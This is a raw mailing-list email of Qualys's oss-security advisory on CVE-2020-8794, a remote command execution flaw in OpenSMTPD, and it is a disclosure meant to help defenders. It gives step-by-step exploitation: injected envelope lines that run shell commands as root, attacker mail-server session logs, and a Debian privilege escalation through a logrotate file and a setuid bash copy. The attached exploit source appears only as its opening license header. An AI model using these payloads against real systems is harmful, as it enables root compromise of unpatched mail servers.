X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["31671" "Wednesday" "26" "February" "2020" "12:28:19" "-0800" "Qualys Security Advisory" "qsa@qualys.com" nil "983" nil "^Date:" nil nil "2" nil nil (number mark "        qsa@qualys.c Feb 26  983/31671 " thread-indent "\"Re: [oss-security] LPE and RCE in OpenSMTPD's default install (CVE-2020-8794)\"\n") nil nil nil nil nil nil nil nil nil "Re: [oss-security] LPE and RCE in OpenSMTPD's default install (CVE-2020-8794)" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 5587 invoked by uid 550); 26 Feb 2020 19:38:24 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 5566 invoked from network); 26 Feb 2020 19:38:23 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qualys.com; h=date : from : to :
 subject : message-id : references : content-type : in-reply-to :
 mime-version; s=qualyscom;
 bh=XKB0VsWG2k89bb74jfP+R5mah/vt2EI5GXbEiHwvbbc=;
 b=3tp9V8TlICuQkxxBkvjNXjTwmP6W7dZO5uHJzj3XbOMedmCBAZKGovLokb9P1jytIDA9
 42nXz0LSAtn+Rp5bR64F1hqRnpZPnhvXKbNw8dClyKJGkJsJvIuXXwD06IfF+nn3+wBy
 3wv6EswF3CzrZueEVMxiudMIGFeMmT3koOX0cuSKed2tW7+8XmU4RGimmr/x9UYQ6hNc
 aF1ov/uuOBLU4lGgukQtYmak8p7523MHI+ukQWPmn6dYo8ZbdQOvrl/zl86/CkRGG0ZB
 4C2wC12QNgiAHwQqwDz55Amo1Lf1Sj6hy2+mu0Zo5O94yCY7icV+cwIBrKMCjfPBpZ6B nw== 
Authentication-Results: ppops.net;
	spf=pass smtp.mailfrom=qsa@qualys.com
ARC-Seal: i=1; a=rsa-sha256; s=arcselector9901; d=microsoft.com; cv=none;
 b=X5R6jEwDMpy8MoqC69J/EGSdlkM9k0AM/2EU1vyhpekxLB1+L/NZjdr9l0dS6eInZZZWjnafIScTzLklrkD9osDbNdfC+Md6llvU/WrF10YozLot6Xm4ucMyYgKXoixPnLrbJU8ilApsIGOvD4knGLfpBSYI/p3UDF4LO6Ae6nKzQxb832zNqMyhoCwUmUdeg506rTpiB8GRNK5z4ZQru1PFsEVexPISf4nQ3Kbe9yS5XUpu69mXk+76yT7kqFmj4DX/sXvksEnMa3jO6po9JDHz+fIQYN+njoSUCE0F4DN0oNQYf9o7Fh2As/4H2Swua1oEuvJiBdLVTGjIt7/ADA==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
 s=arcselector9901;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
 bh=XKB0VsWG2k89bb74jfP+R5mah/vt2EI5GXbEiHwvbbc=;
 b=Z7OIsgo2YRf4ej/Xkqf/56s+GpNvYg3nt2wObtXu2Pi84Cq2gdLTtjsf71tOhnGbm3gvg2BwAsh++dbFE+6MDUHK756rLiqBCh/WLvp+26IPMQ4427ImnLCEw4rR6boCe1UntMOiw3766pGhtmYRDuSSYOEkz+84Q9kXNfm23yF7451Qc/VxHD3WecxjWVNuKPqAm9QRrr1KZ8Ghv8dPWDarZpWHsIrRweRuNL8IJdeCjiQVqIpPYtK4omFsOY6Wv2DwwiRjTu3LXuFN5fL4Pt0WtUf1KSVnE58bL1LdR+CDZoge+WgZMuy5XxjBMP6gKUNHv4jBC8OaW8CA0Wj4XA==
ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
 smtp.mailfrom=qualys.com; dmarc=pass action=none header.from=qualys.com;
 dkim=pass header.d=qualys.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=qualys.onmicrosoft.com; s=selector2-qualys-onmicrosoft-com;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
 bh=XKB0VsWG2k89bb74jfP+R5mah/vt2EI5GXbEiHwvbbc=;
 b=AdtWMLf27RLZOiOPlSNdE+X1sC/TExzR9kSSijxIaYVzDcnewxs6SE741A9Vwtv94jrzjd2X/PkGUM2pHYUUvLr5tjIodAgzd3Oc0KtI/JD9G4hyML2aOenIqFsAyYUDsoODXebsFyC0zk7zw2k0YEJG8Bd5LBEUX683WT3tZ7A=
Message-ID: <20200226202819.GA1051@localhost.localdomain>
References: <20200224184538.GF17396@localhost.localdomain>
Content-Type: multipart/mixed; boundary="6c2NcOVqGQ03X4Wi"
Content-Disposition: inline
In-Reply-To: <20200224184538.GF17396@localhost.localdomain>
X-ClientProxiedBy: BYAPR05CA0013.namprd05.prod.outlook.com
 (2603:10b6:a03:c0::26) To DM6PR06MB4090.namprd06.prod.outlook.com
 (2603:10b6:5:89::22)
MIME-Version: 1.0
X-MS-Exchange-MessageSentRepresentingType: 1
X-Originating-IP: [165.193.18.162]
X-MS-PublicTrafficType: Email
X-MS-Office365-Filtering-Correlation-Id: 443b2204-eb06-4a50-0995-08d7baf367dc
X-MS-TrafficTypeDiagnostic: DM6PR06MB4507:
X-Microsoft-Antispam-PRVS: 
	<DM6PR06MB450737C2DB30AC2746C1B93BD5EA0@DM6PR06MB4507.namprd06.prod.outlook.com>
X-MS-Oob-TLC-OOBClassifiers: OLM:175;
X-Forefront-PRVS: 0325F6C77B
X-Forefront-Antispam-Report: 
	SFV:NSPM;SFS:(10019020)(4636009)(136003)(366004)(39860400002)(346002)(376002)(396003)(189003)(199004)(6916009)(956004)(2906002)(66946007)(1076003)(66616009)(316002)(86362001)(66556008)(44144004)(52116002)(7696005)(33964004)(33656002)(6666004)(66476007)(81166006)(30864003)(81156014)(15650500001)(69590400006)(26005)(478600001)(16526019)(8676002)(186003)(55016002)(6506007)(235185007)(5660300002)(9686003)(8936002)(2700100001)(131040200001);DIR:OUT;SFP:1102;SCL:1;SRVR:DM6PR06MB4507;H:DM6PR06MB4090.namprd06.prod.outlook.com;FPR:;SPF:None;LANG:en;PTR:InfoNoRecords;MX:1;A:1;
Received-SPF: None (protection.outlook.com: qualys.com does not designate
 permitted sender hosts)
X-MS-Exchange-SenderADCheck: 1
X-Microsoft-Antispam: BCL:0;
X-Microsoft-Antispam-Message-Info: 
	Kv7DJKtoGstDLhR9hci1ruHCZYhbXfsFCF320Evpia+soX9ZV1y2uHNdBDaSVfHyNGJXEK85rKfrSExcaNkxk6M/2uWwuZPDItOI+1Sb12tADg36o4MoMY2mTRvWDTJobKrownyT4ZnxJXIcD6U1GJj8OT+ek+dyg7fmfIhREcaJdosFqpevc+uQpHH3HOjFdoCqy77s5ubN8IXTPD0Ir955K0jT8Y6BE9NOjlRpT+/gaIMnB+J/GZ2cYJvZbl32ZsYGv0cDRV2j03E1wv94kAfp7y4R7a2gWCdw4EEYQORZh9wOwRLAJTxJaWITg86ZgesRSWkJ2Pe14IcxW2R6tsgSYfNRet4oF4JFzX2FqgwUlKHgEdk22lbZYtFNd83rq61SqPZLuc86CzmaocoDWtkfjzbocfgxagbvGj3EzD8gj8SuAa0lcLXZbVncZUSOuinB4V3Jrozrpk76XzxCbSNb1OjoM1Q+v9px7ThtuUvRpj68YuK5ntTj6YUgIMFhuRoyHCrKOCOeVr8z6WsAL8ZrYV5XV1YaUya1MvcSywt8OsOvNWqiBJl5TuAu8XaUVLFN3gCWo449MNl6fLa1IR1+OoGlQ/4GX2zsez6t8QA=
X-MS-Exchange-AntiSpam-MessageData: 
	OSus2W/s9mXIOHaJukG9uy6dwhGdjk7gG7ggQQ6vbm5tL46nUgEr3vpOP/586uspYehbuER4FGhaiPb8b83BPnt2jBCRdCb+rrLv556Mk9/6cL2B1qp/EvhDTLx21e/PC1fkx+GMoNtTyB1K0nB8iQ==
X-OriginatorOrg: qualys.com
X-MS-Exchange-CrossTenant-Network-Message-Id: 443b2204-eb06-4a50-0995-08d7baf367dc
X-MS-Exchange-CrossTenant-OriginalArrivalTime: 26 Feb 2020 19:38:08.7462
 (UTC)
X-MS-Exchange-CrossTenant-FromEntityHeader: Hosted
X-MS-Exchange-CrossTenant-Id: 81a9ef9a-9a98-4b00-886a-895a603bc029
X-MS-Exchange-CrossTenant-MailboxType: HOSTED
X-MS-Exchange-CrossTenant-UserPrincipalName: UERoVAcBlDlmk01Z0cISwsERaNOh7FSx6D7hpyGyIhZ9noic6YWgrfcmHjLQa+e00MAlheStmNrjj7DQy6U+igOf5+fNZqeVSSXvKiIyhrE=
X-MS-Exchange-Transport-CrossTenantHeadersStamped: DM6PR06MB4507
X-Proofpoint-SPF-Result: pass
X-Proofpoint-SPF-Record: v=spf1 include:_spf.qualys.com include:spf.protection.outlook.com
 include:spf-001ca501.pphosted.com include:stspg-customer.com
 include:spf.salesforce.com include:sendgrid.net include:mktomail.com ~all
X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10434:6.0.138,18.0.572
 definitions=2020-02-26_07:2020-02-26,2020-02-26 signatures=0
Date: Wed, 26 Feb 2020 12:28:19 -0800
From: Qualys Security Advisory <qsa@qualys.com>
Reply-To: oss-security@lists.openwall.com
Subject: Re: [oss-security] LPE and RCE in OpenSMTPD's default install
 (CVE-2020-8794)
To: oss-security@lists.openwall.com

--6c2NcOVqGQ03X4Wi
Content-Type: text/plain; charset="utf-8"
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable


Qualys Security Advisory

LPE and RCE in OpenSMTPD's default install (CVE-2020-8794)


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D
Contents
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D

Summary
Analysis
Client-side exploitation (new grammar)
Server-side exploitation (new grammar)
Old-grammar exploitation
Acknowledgments


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D
Summary
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D

We discovered a vulnerability in OpenSMTPD, OpenBSD's mail server. This
vulnerability, an out-of-bounds read introduced in December 2015 (commit
80c6a60c, "when peer outputs a multi-line response ..."), is exploitable
remotely and leads to the execution of arbitrary shell commands: either
as root, after May 2018 (commit a8e22235, "switch smtpd to new
grammar"); or as any non-root user, before May 2018.

Because this vulnerability resides in OpenSMTPD's client-side code
(which delivers mail to remote SMTP servers), we must consider two
different scenarios:

- Client-side exploitation: This vulnerability is remotely exploitable
  in OpenSMTPD's (and hence OpenBSD's) default configuration. Although
  OpenSMTPD listens on localhost only, by default, it does accept mail
  from local users and delivers it to remote servers. If such a remote
  server is controlled by an attacker (either because it is malicious or
  compromised, or because of a man-in-the-middle, DNS, or BGP attack --
  SMTP is not TLS-encrypted by default), then the attacker can execute
  arbitrary shell commands on the vulnerable OpenSMTPD installation.

- Server-side exploitation: First, the attacker must connect to the
  OpenSMTPD server (which accepts external mail) and send a mail that
  creates a bounce. Next, when OpenSMTPD connects back to their mail
  server to deliver this bounce, the attacker can exploit OpenSMTPD's
  client-side vulnerability. Last, for their shell commands to be
  executed, the attacker must (to the best of our knowledge) crash
  OpenSMTPD and wait until it is restarted (either manually by an
  administrator, or automatically by a system update or reboot).

We developed a simple exploit for this vulnerability and successfully
tested it against OpenBSD 6.6 (the current release), OpenBSD 5.9 (the
first vulnerable release), Debian 10 (stable), Debian 11 (testing), and
Fedora 31. At OpenBSD's request, and to give OpenSMTPD's users a chance
to patch their systems, we are withholding the exploitation details and
code until Wednesday, February 26, 2020.

Last-minute note: we tested our exploit against the recent changes in
OpenSMTPD 6.6.3p1, and our results are: if the "mbox" method is used for
local delivery (the default in OpenBSD -current), then arbitrary command
execution as root is still possible; otherwise (if the "maildir" method
is used, for example), arbitrary command execution as any non-root user
is possible.


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D
Analysis
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D

SMTP clients connect to SMTP servers and send commands such as EHLO,
MAIL FROM, and RCPT TO. SMTP servers respond with either single-line or
multiple-line replies:

- the first lines begin with a three-digit code and a hyphen ('-'),
  followed by an optional text (for example, "250-ENHANCEDSTATUSCODES");

- the last line begins with the same three-digit code, followed by an
  optional space (' ') and text (for example, "250 HELP").

In OpenSMTPD's client-side code, these multiline replies are parsed by
the mta_io() function:

---------------------------------------------------------------------------=
---
1098 static void
1099 mta_io(struct io *io, int evt, void *arg)
1100 {
....
1133         case IO_DATAIN:
1134             nextline:
1135                 line =3D io_getline(s->io, &len);
....
1146                 if ((error =3D parse_smtp_response(line, len, &msg, &c=
ont))) {
---------------------------------------------------------------------------=
---

- the first lines (when line[3] =3D=3D '-') are concatenated into a 2KB
  replybuf:

---------------------------------------------------------------------------=
---
1177                 if (cont) {
1178                         if (s->replybuf[0] =3D=3D '\0')
1179                                 (void)strlcat(s->replybuf, line, sizeo=
f s->replybuf);
1180                         else {
1181                                 line =3D line + 4;
....
1187                                         (void)strlcat(s->replybuf, lin=
e, sizeof s->replybuf);
1188                         }
1189                         goto nextline;
1190                 }
---------------------------------------------------------------------------=
---

- the last line (when line[3] !=3D '-') is also concatenated into
  replybuf:

---------------------------------------------------------------------------=
---
1195                 if (s->replybuf[0] !=3D '\0') {
1196                         p =3D line + 4;
....
1201                         if (strlcat(s->replybuf, p, sizeof s->replybuf=
) >=3D sizeof s->replybuf)
---------------------------------------------------------------------------=
---

Unfortunately, if the last line's three-digit code is not followed by
the optional space and text, then p (at line 1196) points to the first
character *after* the line's '\0' terminator (which replaced the line's
'\n' terminator in iobuf_getline()), and this out-of-bounds string is
concatenated into replybuf (at line 1201).

The three following key insights explain how we transformed this
out-of-bounds read into a reliable command execution:

- We (attackers) precisely control the "out-of-bounds" string that
  follows the last line of our reply, because OpenSMTPD reads our reply
  in blocks, not character by character: if we send a last "line" of the
  form "xyz\nstring\0", then "string" is concatenated into replybuf.

- If the three-digit code of our reply indicates a temporary error (4yz)
  or a permanent error (5yz), then the contents of replybuf are written
  to the "errorline" field of the envelope that internally describes the
  mail that OpenSMTPD is trying to deliver.

- This envelope is basically a file that contains lines of the form
  "field: data\n", and our out-of-bounds string (which is written to the
  "errorline" field of the envelope) can contain '\n' characters: we can
  inject new lines into the envelope and change OpenSMTPD's behavior.


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D
Client-side exploitation (new grammar)
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D

The client-side exploitation of this vulnerability is straightforward;
we wait until OpenSMTPD connects to our mail server and respond with a
multiline reply (a permanent error) that creates a bounce and injects
the following lines into its envelope:

---------------------------------------------------------------------------=
---
type: mda
mda-exec: our arbitrary shell command
dispatcher: local_mail
mda-user: root
---------------------------------------------------------------------------=
---

where "local_mail" is the name of OpenSMTPD's local dispatcher (from its
default configuration). Our MDA command is immediately executed when
OpenSMTPD tries to deliver this bounce, because our injected lines
changed its type from MTA (Message Transfer Agent) to MDA (Message
Delivery Agent). For example, against OpenBSD 6.6:

- First, on the OpenBSD machine, a local user sends a mail (where
  "[192.168.56.1]" is the IP address of the attacker's mail server, but
  it could also be a trusted but compromised or hijacked domain name --
  for example, the sendbug(1) utility sends mail to bugs@openbsd.org):

---------------------------------------------------------------------------=
---
$ id
uid=3D1001(john) gid=3D1001(john) groups=3D1001(john)

$ echo test | /usr/sbin/sendmail 'test@[192.168.56.1]'
---------------------------------------------------------------------------=
---

- Next, on the attacker's mail server:

---------------------------------------------------------------------------=
---
# ./ent-of-line
...
Connection from 192.168.56.104:39404
...
<-- MAIL FROM:<john@obsd66.example.org>
--> 553-Error
--> 553

type:mda
mda-exec:X=3D`mktemp /tmp/x.XXXXXX`&&id>>$X;exit 0
dispatcher:local_mail
mda-user:root
---------------------------------------------------------------------------=
---

- Last, on the OpenBSD machine:

---------------------------------------------------------------------------=
---
# cat /tmp/x.*
uid=3D0(root) gid=3D0(wheel) groups=3D0(wheel)
---------------------------------------------------------------------------=
---


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D
Server-side exploitation (new grammar)
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D

The server-side exploitation of this vulnerability is more complicated;
we face three different problems:

- The vulnerability resides in OpenSMTPD's client-side code, not
  server-side code. To solve this first problem, we connect to the
  OpenSMTPD server, send a mail that creates a bounce (by requesting a
  Delivery Status Notification or simulating a mail loop), and wait a
  few minutes until OpenSMTPD connects to our mail server to deliver
  this bounce.

- We cannot respond to this bounce delivery with a permanent error:
  OpenSMTPD would simply discard this "bounced" bounce (a double bounce)
  and hence our injected lines. To solve this second problem, we respond
  with a temporary error instead, which keeps the bounce and injects our
  new lines into its envelope.

- OpenSMTPD does not immediately execute our injected MDA command,
  because it still caches the bounce in its MTA queue, not MDA queue.
  Our solution to this third problem is not ideal (but better solutions
  may exist): we force OpenSMTPD to "lose its memory" by crashing it (we
  re-exploit the vulnerability, and inject a fatal "type: invalid" line
  into the envelope of a second bounce), and we wait until OpenSMTPD is
  restarted (either manually by an administrator, or automatically by a
  system update or reboot). As soon as OpenSMTPD restarts, it executes
  the injected MDA command of our first bounce (and simply ignores our
  invalid, second bounce).

For example, against OpenBSD 6.6:

- First, on the attacker's mail server (where "192.168.56.104" is the
  OpenBSD machine, "192.168.56.1" is the attacker's mail server, and
  "root@example.org" is a valid mail address on the OpenBSD machine):

---------------------------------------------------------------------------=
---
# ./ent-of-line 192.168.56.104 'test@[192.168.56.1]' root@example.org
...
Connected to 192.168.56.104:25
...
--> MAIL FROM:<test@[192.168.56.1]>
<-- 250 2.0.0 Ok
--> RCPT TO:<root@example.org> NOTIFY=3DSUCCESS
<-- 250 2.1.5 Destination address valid: Recipient ok
...
Connection from 192.168.56.104:40061
...
<-- MAIL FROM:<>
--> 421-Error
--> 421

type:mda
mda-exec:X=3D`mktemp /tmp/x.XXXXXX`&&id>>$X;exit 0
dispatcher:local_mail
mda-user:root

Connected to 192.168.56.104:25
...
--> MAIL FROM:<test@[192.168.56.1]>
<-- 250 2.0.0 Ok
--> RCPT TO:<root@example.org> NOTIFY=3DSUCCESS
<-- 250 2.1.5 Destination address valid: Recipient ok
...
Connection from 192.168.56.104:20037
...
<-- MAIL FROM:<>
--> 421-Error
--> 421

type:invalid
---------------------------------------------------------------------------=
---

- Then, on the OpenBSD machine (when the administrator restarts the
  crashed OpenSMTPD):

---------------------------------------------------------------------------=
---
# cat /tmp/x.*
cat: /tmp/x.*: No such file or directory

# rcctl restart smtpd
smtpd(ok)

# cat /tmp/x.*
uid=3D0(root) gid=3D0(wheel) groups=3D0(wheel)
---------------------------------------------------------------------------=
---


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D
Old-grammar exploitation
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D

To exploit older OpenSMTPD versions (before commit a8e22235, "switch
smtpd to new grammar"), we inject the following lines instead:

---------------------------------------------------------------------------=
---
type: mda
mda-buffer: our arbitrary shell command
mda-method: mda
mda-user: nobody
mda-usertable: <getpwnam>
---------------------------------------------------------------------------=
---

where "nobody" can be any user except root. The ability to execute
arbitrary commands as any non-root user is usually enough to obtain full
root privileges: the attacker can trojan an administrator's su, sudo, or
doas; and some system users have privileges that can be escalated to
root.

Moreover, after the attacker obtains a non-root shell on an older
OpenSMTPD installation, they can re-exploit the vulnerability and use
the MDA method "maildir" instead of "mda":

- they can invoke this method as root and create a file in an arbitrary
  directory of the filesystem (because the "maildir" method follows
  symlinks);

- they partly control the contents of this file (it contains the body of
  their mail).

For example, on Debian 10, the attacker can create a file in
/etc/logrotate.d and execute arbitrary commands, as root:

- First, on the attacker's mail server (where "192.168.56.141" is the
  Debian machine, "192.168.56.1" is the attacker's mail server, and
  "root@example.org" is a valid mail address on the Debian machine):

---------------------------------------------------------------------------=
---
# ./ent-of-line -u nobody 192.168.56.141 'test@[192.168.56.1]' root@example=
.org
...
Connected to 192.168.56.141:25
...
--> MAIL FROM:<test@[192.168.56.1]>
<-- 250 2.0.0: Ok
--> RCPT TO:<root@example.org> NOTIFY=3DSUCCESS
<-- 250 2.1.5 Destination address valid: Recipient ok
...
Connection from 192.168.56.141:35378
...
<-- MAIL FROM:<>
--> 421-Error
--> 421

type:mda
mda-buffer:X=3D`mktemp /tmp/x.XXXXXX`&&id>>$X;exit 0
mda-method:mda
mda-user:nobody
mda-usertable:<getpwnam>

Connected to 192.168.56.141:25
...
--> MAIL FROM:<test@[192.168.56.1]>
<-- 250 2.0.0: Ok
--> RCPT TO:<root@example.org> NOTIFY=3DSUCCESS
<-- 250 2.1.5 Destination address valid: Recipient ok
...
Connection from 192.168.56.141:35380
...
<-- MAIL FROM:<>
--> 421-Error
--> 421

type:invalid
---------------------------------------------------------------------------=
---

- Second, on the Debian machine (when the administrator restarts the
  crashed OpenSMTPD):

---------------------------------------------------------------------------=
---
# cat /tmp/x.*
cat: '/tmp/x.*': No such file or directory

# systemctl restart opensmtpd.service

# cat /tmp/x.*
uid=3D65534(nobody) gid=3D65534(nogroup) groups=3D65534(nogroup)
---------------------------------------------------------------------------=
---

- Third, on the Debian machine (after the attacker obtained a "nobody"
  shell):

---------------------------------------------------------------------------=
---
$ id
uid=3D65534(nobody) gid=3D65534(nogroup) groups=3D65534(nogroup)

$ mkdir -m 0700 /tmp/maildir
$ cd /tmp/maildir

$ ln -s /etc tmp
$ ln -s /etc/logrotate.d new

$ /usr/sbin/sendmail 'test@[192.168.56.1]' << 'EOF'
/var/log/lastlog {
    missingok
    rotate 1
    nomail
    size 1
    copy
    firstaction
        cp -f /bin/bash /var/log && chmod 04555 /var/log/bash
    endscript
}
EOF
---------------------------------------------------------------------------=
---

- Fourth, on the attacker's mail server:

---------------------------------------------------------------------------=
---
# ./ent-of-line -m /tmp/maildir
...
Connection from 192.168.56.141:35382
...
<-- MAIL FROM:<nobody@debian>
--> 553-Error
--> 553

type:mda
mda-buffer:/tmp/maildir
mda-method:maildir
mda-user:root
mda-usertable:<getpwnam>
---------------------------------------------------------------------------=
---

- Last, on the Debian machine (after cron or systemd executed
  logrotate):

---------------------------------------------------------------------------=
---
$ id
uid=3D65534(nobody) gid=3D65534(nogroup) groups=3D65534(nogroup)

$ /var/log/bash -p

# id
uid=3D65534(nobody) gid=3D65534(nogroup) euid=3D0(root) groups=3D65534(nogr=
oup)
---------------------------------------------------------------------------=
---


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D
Acknowledgments
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D

We thank OpenBSD's developers for their quick response and patches. We
also thank Gilles for his hard work and beautiful code.



[https://d1dejaj6dcqv24.cloudfront.net/asset/image/email-banner-384-2x.png]=
<https://www.qualys.com/email-banner>



This message may contain confidential and privileged information. If it has=
 been sent to you in error, please reply to advise the sender of the error =
and then immediately delete it. If you are not the intended recipient, do n=
ot read, copy, disclose or otherwise use this message. The sender disclaims=
 any liability for such unauthorized use. NOTE that all incoming emails sen=
t to Qualys email accounts will be archived and may be scanned by us and/or=
 by external service providers to detect and prevent threats to our systems=
, investigate illegal or inappropriate behavior, and/or eliminate unsolicit=
ed promotional emails (=E2=80=9Cspam=E2=80=9D). If you have any concerns ab=
out this process, please contact us.

--6c2NcOVqGQ03X4Wi
Content-Type: text/plain; charset=us-ascii
Content-Disposition: attachment; filename="ent-of-line.c"

/*
 * LPE and RCE in OpenSMTPD's default install (CVE-2020-8794)
 * Copyright (C) 2020 Qualys, Inc.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
